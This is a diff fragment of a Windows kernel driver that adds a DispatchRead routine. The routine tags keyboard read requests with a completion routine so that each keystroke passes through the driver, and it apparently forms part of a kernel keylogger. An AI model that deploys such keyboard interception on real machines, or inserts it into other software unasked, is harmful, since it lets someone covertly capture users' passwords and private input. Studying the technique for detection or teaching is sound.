@@ -41,6 +41,21 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject) {
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
+	DbgPrint("Entering DispatchRead Routine.\n");
+
+	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
+	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
+	*nextIrpStack = *currentIrpStack;
+
+	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);
+
+	numPendingIrps++;
+
+	DbgPrint("Tagged keyboard 'read' IRP.\n");
+	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
+}
+
 NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
 	DbgPrint("Entering read complete.\n");
 
